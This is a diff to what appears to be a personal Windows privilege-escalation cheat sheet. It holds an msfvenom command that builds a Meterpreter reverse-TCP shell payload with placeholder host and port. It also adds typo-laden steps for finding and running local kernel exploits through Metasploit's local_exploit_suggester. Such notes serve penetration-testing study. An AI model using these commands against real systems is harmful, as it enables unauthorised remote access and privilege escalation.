@@ -37,7 +37,7 @@ netstat - command to get the ports.
 sc - command to use service control.
 ---
 ```
-## Reverse shell using ftp
+## Reverse shell using ftp and meterpreter
 ```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=X -f (file type) -o (file name)
 ---
@@ -114,5 +114,20 @@ Other
 ---
 windows-exploit-suggester.py (local on attack machine)
 Exploit suggester (Metasploit)
+```
+# Local_exploit_suggester
+```
+We can scan for kernel exploits with the next command on the meterpreter:
+run post/multi/recon/local_exploit_suggester
+---
+After we can we find some exploits we can use the command ---> background.
+After we used the command we need to run the exploit that we want to abuse with the next command ---> usr exploit/windows/local/****exploit****
+
+Now we need to set out session to the seesion that we got from the background command with the command ---> set session ?.
+
+We need to set out lhost and lport (we need to use a different port from which we used in the reverse shell).
+
+Then we can use run
+
 
 ```
